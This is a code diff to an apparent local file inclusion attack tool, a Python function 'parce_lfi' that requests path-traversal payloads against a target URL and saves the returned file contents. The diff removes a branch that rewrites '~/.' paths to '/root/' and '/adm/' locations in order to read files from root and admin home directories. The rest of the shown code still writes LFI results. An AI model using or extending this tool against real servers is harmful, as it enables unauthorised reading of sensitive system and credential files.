@@ -37,18 +37,6 @@ def parce_lfi(link_url):
 		result_lfi_file.write(result_lfi)
 
 			
-		if "~/" in lfi_file:
-			lfi_file_root = lfi_file.replace('~/.', '/root/')
-			url = link_url+lfi_file_root
-			request_lfi = requests.get(url)
-			result_lfi_r = lfi_file_root+'\n'+request_lfi.text
-			result_lfi_file.write(result_lfi_r)
-			
-			lfi_file_adm = lfi_file.replace('~/.', '/adm/')
-			url = link_url+lfi_file_adm
-			request_lfi = requests.get(url)
-			result_lfi_a = lfi_file_adm+'\n'+request_lfi.text
-			result_lfi_file.write(result_lfi_a)
 		print(url)	
 	
 	
